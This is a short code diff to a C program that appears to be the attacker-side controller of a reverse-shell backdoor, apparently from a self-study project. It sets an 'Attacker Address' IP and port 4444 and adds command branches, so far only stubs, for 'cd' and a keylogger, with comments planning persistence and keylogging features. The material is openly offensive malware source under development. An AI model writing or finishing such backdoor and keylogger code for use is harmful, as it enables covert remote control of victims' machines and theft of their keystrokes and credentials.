@@ -55,7 +55,7 @@ int main()
     //IP, Port
 
     server_address.sin_family = AF_INET; //IPv4
-    server_address.sin_addr.s_addr = inet_addr("10.0.3.150"); //Attacker Address
+    server_address.sin_addr.s_addr = inet_addr("192.168.1.52"); //Attacker Address
     server_address.sin_port = htons(4444);//Target port
 
 
@@ -100,13 +100,24 @@ int main()
 
 
         //If buffer specify q option want to terminate the session.
-        if (strcmp("q", buffer) == 0)
+        if (strncmp("q", buffer, 1) == 0)
         {
             //No need WSA cleanup here for the process termination because the program is running on the linux environment.
             break;
         }
         //Now need to receive the response from the target. 
         //Perfoam inside else that.
+
+        //Let's add backdoor immplemented functions. >> cd, persist, keylog here.
+        else if(strncmp("cd ", buffer, 3) == 0)
+        {
+            goto jump;
+        }
+        //kelogger implementatiom on C
+        else if(strncmp("keylog", buffer, 6) == 0)
+        {
+            goto jump;
+        }
         else
         {   
             //'recv' function takes client socket and response and size of the reponse and flag.
